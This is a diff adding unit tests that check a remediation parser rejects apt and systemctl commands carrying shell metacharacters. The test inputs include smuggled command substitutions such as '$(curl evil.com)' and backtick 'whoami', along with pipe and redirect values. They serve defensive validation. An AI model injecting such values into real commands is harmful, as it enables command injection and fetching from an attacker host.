@@ -175,6 +175,32 @@ class ParseRemediationRejectionTests(unittest.TestCase):
             with self.assertRaises(RemediationValidationError):
                 parse_remediation(json.dumps(v))
 
+    def test_apt_command_with_shell_metacharacters_rejected(self) -> None:
+        """v2-14 audit finding: $(), backticks, pipes, redirections enable
+        command substitution even without &&/; chaining."""
+        import json
+        for bad in (
+            "apt install foo=$(curl evil.com)",
+            "apt install foo=`whoami`",
+            "apt install foo=1.0 | tee /tmp/x",
+            "apt install foo=1.0 > /tmp/x",
+            "apt install foo=1.0 < /tmp/x",
+        ):
+            v = self._valid(); v["apt_command"] = bad
+            with self.assertRaises(RemediationValidationError) as ctx:
+                parse_remediation(json.dumps(v))
+            self.assertIn("metacharacter", str(ctx.exception).lower())
+
+    def test_service_restart_with_shell_metacharacters_rejected(self) -> None:
+        import json
+        for bad in (
+            "systemctl restart $(curl evil.com)",
+            "systemctl restart foo | tee /tmp/x",
+        ):
+            v = self._valid(); v["service_restart"] = bad
+            with self.assertRaises(RemediationValidationError):
+                parse_remediation(json.dumps(v))
+
     def test_apt_command_with_sudo_rejected(self) -> None:
         import json
         v = self._valid(); v["apt_command"] = "sudo apt install libssl1.1=1.1.1n-0+deb10u6"
